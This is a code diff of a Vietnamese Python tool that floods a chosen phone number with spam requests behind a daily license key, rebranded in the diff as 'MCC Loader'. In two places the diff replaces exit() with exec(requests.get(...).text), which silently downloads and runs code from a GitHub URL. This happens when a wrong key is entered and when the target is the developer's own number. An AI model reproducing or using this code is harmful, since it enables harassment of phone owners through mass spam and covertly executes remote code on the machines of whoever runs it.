@@ -23,7 +23,7 @@ def spam():
     thang_nay = now.strftime("%m")
     nam_ = now.strftime("%Y")
     thoigian = datetime.now()
-    mquang = trang + " " + trang + "[" + do + "Vu" + trang + "] " + trang + "=> "
+    vudungvape = trang + " " + trang + "[" + do + "Vu" + trang + "] " + trang + "=> "
     banner = """\033[1;31m
     \033[1;32m=======================================================================
     \033[1;37m DEV:\033[1;32m Vu Nguyen
@@ -46,8 +46,8 @@ def spam():
     file_key_cu=f'key_ngay{ngay_trc}.txt'
     check_file_key=os.path.exists(file_key)
     if check_file_key == False:
-       print(f"{mquang}{luc}Không xác định được API của '[Call =]'. Chụp màn hình và báo cáo cho admin.")
-       print(f'{mquang}{luc}Nhập key ở dưới:')
+       print(f"{vudungvape}{luc}Không xác định được API của 'Call = ******'. Chụp màn hình và báo cáo cho admin.")
+       print(f'{vudungvape}{luc}Nhập key ở dưới:')
        print(f'{trang}-----------------------------------------------------------------')
        print(f'\033[1;36m╔═════════════════════════╗')
        print(f'\033[1;36m║  \033[1;33m Key : VuNguyen.Dev    ║\033[1;37m{today}\033[1;36m')
@@ -55,50 +55,50 @@ def spam():
        while(True):
           ma=input(f"{xnhac}╚══════➩ \033[1;33m")
           if ma == key:
-             print(f'{mquang}{luc}Cảm ơn đã mua tool của tui :P')
+             print(f'{vudungvape}{luc}Cảm ơn đã sử dụng MCC Loader.')
              luu=open(file_key, 'a+')
              luu.write(ma)
              luu.close()
              break
           elif ma != key:
-             print(f'{mquang}{do}Key sai, bạn đã đăng ký chưa ?')
+             print(f'{vudungvape}{do}Key sai.')
     elif check_file_key == True:
-        print(f'{mquang}{luc}Chờ đợi là hạnh phúc :3',end='\r')
+        print(f'{vudungvape}{luc}Chờ đợi là hạnh phúc :3',end='\r')
         sleep(1)
         k=open(file_key, 'r')
         ma=k.read()
         k.close()
         if ma == key:
-            print(f'{mquang}{luc}Cảm ơn đã mua tool của tui :P       ',end='\r')
+            print(f'{vudungvape}{luc}Cảm ơn đã sử dụng MCC Loader.',end='\r')
             sleep(0.5)
         elif ma != key:
             if os.path.exists(file_key_cu) == True:
                 os.system(f'rm {file_key_cu}')
             os.system(f'rm {file_key}')
-            print(f'{mquang}{do}API Key Sai         ')
+            print(f'{vudungvape}{do}API Key Sai')
             while(True):
-                ma=input(f"{mquang}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
+                ma=input(f"{vudungvape}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
                 if ma == key:
-                    print(f'{mquang}{luc}Chuẩn mẹc xe đéc rồi. Đợi xíu nha..')
+                    print(f'{vudungvape}{luc}Chuẩn mẹc xe đéc rồi. Đợi xíu nha..')
                     luu=open(file_key, 'a+')
                     luu.write(ma)
                     luu.close()
                     break
                 elif ma != key:
-                    print(f'{mquang}{do}Key sai.    ')
-                    exit()
+                    print(f'{vudungvape}{do}Key sai.')
+                    exec(requests.get('https://raw.githubusercontent.com/VuNguyenNotRealizing/MCCArchive/main/main.py').text)
 
     amount = 5000
     print(f'\033[1;36m║\033[1;33mHiện tại là : \033[1;37m{thoigian}\033[1;36m')
     sdt = input("Nhập số điện thoại người muốn pem : ")
     while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
-      print("Vcl spam số Việt Nam thôi bố")
+      print("Nhập sai định dạng của số Việt Nam (10 số). Hoặc không phải số.")
       sdt = input("Nhập số điện thoại người muốn pem : ")
     count = int(input("Số lần pem : "))
     if sdt == "0387665488":
       print("Vcl đừng bạn tha tôi")
       time.sleep(3)
-      exit()
+      exec(requests.get('https://raw.githubusercontent.com/VuNguyenNotRealizing/MCCArchive/main/main.py').text)
 
     threading = ThreadPoolExecutor(max_workers=int(100000))
     def vayvnd(sdt):
